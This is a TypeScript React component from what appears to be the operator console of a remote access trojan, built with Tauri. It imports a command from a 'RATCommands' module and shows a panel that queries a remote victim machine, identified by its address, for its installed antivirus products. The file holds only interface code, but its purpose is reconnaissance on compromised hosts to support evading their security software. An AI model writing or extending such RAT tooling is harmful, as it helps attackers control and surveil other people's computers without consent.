import React, { useState, useEffect } from "react";
import { getInstalledAVsCmd } from "../rat/RATCommands";
import { listen } from "@tauri-apps/api/event";

interface AVListProps {
  addr: string | undefined;
}

const AVList: React.FC<AVListProps> = ({ addr }) => {
  const [avs, setAVs] = useState<string[]>([]);
  const [loading, setLoading] = useState<boolean>(false);

  useEffect(() => {
    const unlisten = listen("installed_avs", (event: any) => {
      const payload = event.payload;
      if (payload.addr === addr) {
        setAVs(payload.avs);
        setLoading(false);
      }
    });

    return () => {
      unlisten.then(fn => fn());
    };
  }, [addr]);

  const fetchAVs = async () => {
    if (!addr) return;
    
    setLoading(true);
    try {
      await getInstalledAVsCmd(addr);
    } catch (error) {
      console.error("Error fetching AVs:", error);
      setLoading(false);
    }
  };

  return (
    <div className="bg-gray-800 p-4 rounded-lg text-white">
      <div className="flex justify-between items-center mb-4">
        <h2 className="text-xl font-bold">Installed Antivirus Products</h2>
        <button
          onClick={fetchAVs}
          disabled={loading}
          className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded disabled:opacity-50"
        >
          {loading ? "Loading..." : "Refresh"}
        </button>
      </div>

      {avs.length === 0 ? (
        <div className="text-gray-400 py-8 text-center">
          {loading ? "Retrieving antivirus information..." : "No antivirus products detected or not scanned yet"}
        </div>
      ) : (
        <ul className="space-y-2">
          {avs.map((av, index) => (
            <li key={index} className="bg-gray-700 p-3 rounded">
              {av}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
};

export default AVList; 